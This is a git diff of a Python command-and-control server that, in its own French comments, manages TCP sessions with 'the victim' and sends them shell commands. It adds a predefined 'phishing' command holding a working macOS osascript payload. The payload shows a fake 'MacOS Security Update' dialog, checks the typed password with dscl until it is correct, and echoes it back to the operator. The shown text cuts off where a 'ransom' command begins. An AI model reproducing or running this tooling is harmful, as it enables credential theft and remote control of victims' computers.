@@ -1,6 +1,7 @@
 import socket
 
 
+# Démarre et gère les échanges TCP avec la victime. Les échanges peuvent être pipés vers une fonction (voir cb)
 def startSocketServer(_host="0.0.0.0", _port=5050, cb=print):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((_host, _port))
@@ -12,6 +13,7 @@ def startSocketServer(_host="0.0.0.0", _port=5050, cb=print):
         with client_socket:
             while True:
                 command = input("~$: ")
+                # Deux commandes personnalisées prédéfinies
                 if command.lower() == 'phishing':
                     command = '''PWD_=$(osascript -e 'display dialog "To perform a security update MacOS needs your password." with title "MacOS Security Update" default answer "" with icon 2 with hidden answer' -e 'text returned of result' 2>/dev/null);if [[ $(dscl . authonly $(id -un) $PWD_ 2>/dev/null) != "" ]];then while true; do PWD_=$(osascript -e 'display dialog "Incorrect password. Please try again" with title "MacOS Security Update" default answer "" with icon 2 with hidden answer' -e 'text returned of result' 2>/dev/null); if [[ $(dscl . authonly $(id -un) $PWD_ 2>/dev/null) == "" ]]; then break; fi; done fi; echo password : "'"$PWD_"'";'''
                 elif command.lower() == 'ransom':
